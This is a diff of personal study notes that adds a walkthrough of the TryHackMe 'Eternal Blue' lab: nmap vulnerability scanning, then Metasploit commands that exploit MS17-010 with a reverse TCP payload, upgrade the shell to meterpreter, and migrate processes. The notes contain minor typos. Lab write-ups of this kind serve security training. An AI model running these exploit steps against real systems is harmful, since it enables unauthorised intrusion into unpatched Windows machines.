@@ -1,5 +1,6 @@
 Metasploit
 
+nmap -sV --script=vuln <ip>
 nmap -sS -Pn -f <ip>
 
 Step 1. Start Metasploit by typing: msfconsole
@@ -21,8 +22,8 @@ Step 5: Use the Exploit
 
 Step 6: Set the Required Options
     a. View the required options for the exploit: show options
-    b. Set the target's IP address: set RHOST <target_ip>
-    c. Set the local host (your machine’s IP address): set LHOST <your_ip>
+    b. Set the target's IP address: set RHOSTS <target_ip>
+    c. Set the local host (your machine’s IP address): set LHOST <your_ip> (tun0)
 
 Step 7: Launch the Exploit
     1. Run the exploit by typing: exploit
@@ -40,4 +41,89 @@ Step 9: Exit the Meterpreter Session: exit
 
 Metasploit complete guide: https://www.offsec.com/metasploit-unleashed/
 
-Revise the "eternal blue" machine
+Eternal Blue Machine Solution: 
+
+THM Eternal Blue
+
+☆ Steps:
+
+1] nmap -sV--script vuln <ip>
+open ports:
+
+135 msrpc.
+
+139 netbios-SSn
+
+445 microsoft-ds
+
+3389 tcpwrapped
+
+Vulnerability: Remote Code Exe vuln in MS SMBv1 servers (ms17-010)
+
+script: smb-vuln-ms17-010
+
+CVE: CVE-2017-0143
+
+2] Metasploit: 
+
+→cmd: msfconsole
+Search ms17-010
+
+use exploit/windows/smb/ms17-010 eternalblue (use 0)
+
+show options
+
+set RHOSTS <target ip
+
+set payload windows/x64/shell/reverse_tcp
+
+Show options (check the above params are set properly)
+
+exploit
+
+Note: In this attempt we've not set LHOST.
+
+After doing this it didint got exploited so we set:
+
+set LHOST tun0
+
+(Whenever the exploit say target is not vuln then retry by changing LPORT)
+Exploit 
+
+Now we got conn WINDOWS Machine
+
+3) Once you get win shell access
+
+ctrl+z (background)
+
+search shell_to_meterpreter
+
+use o (post/muti/manage/shell_to_meterpreter)
+
+show options
+
+set SESSION 1
+
+Run
+
+NOTE: Here also we have'nt changed LHOST parameter After exploit and we did'nt get meterpreter session So we set LHOST tun0
+
+exploit (wait for 5 mins)
+
+After 3 trials we got meterpreter session!
+
+sessions
+
+Gessions -i 2
+
+We'll be into meterpreter session
+
+meterpreter >> shell
+
+whoami (nt authority system)
+
+ctrl+z
+
+metespreter >> ps
+
+migrate <pid>
